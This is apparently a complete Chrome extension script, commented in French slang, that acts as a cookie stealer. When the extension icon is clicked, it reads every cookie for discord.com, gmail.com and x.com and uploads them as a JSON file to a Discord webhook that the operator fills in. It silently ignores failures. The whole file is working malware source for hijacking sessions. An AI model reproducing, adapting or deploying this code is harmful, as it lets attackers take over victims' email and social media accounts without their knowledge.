const WEBHOOK_URL = "ton webhook discord l'ekip"; 

async function fetchAllCookies(domains) {
  const results = {};
  
  for (const domain of domains) {
    try {
      results[domain] = await new Promise(resolve => {
        chrome.cookies.getAll({ domain }, cookies => {
          resolve(cookies || []);
        });
      });
    } catch (error) {
      results[domain] = { error: error.message };
    }
  }
  
  return results;
}

async function sendToDiscord(data) {
  try {
    const jsonData = JSON.stringify({
      metadata: {
        generatedAt: new Date().toISOString(),
        source: "blaze de ton extension"
      },
      cookies: data
    }, null, 2);

    const formData = new FormData();
    const blob = new Blob([jsonData], { type: 'application/json' });
    formData.append('file', blob, 'cookies_export.json');

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
      signal: controller.signal
    });

    clearTimeout(timeout);

    if (!response.ok) {
      throw new Error(`Erreur ${response.status}: ${await response.text()}`);
    }

    return true;
  } catch (error) {
    return false;
  }
}

const TARGET_DOMAINS = [
  "discord.com",
  "gmail.com",
  "x.com"
];

chrome.action.onClicked.addListener(async () => {
  
  const cookies = await fetchAllCookies(TARGET_DOMAINS);
  
  await sendToDiscord(cookies);
});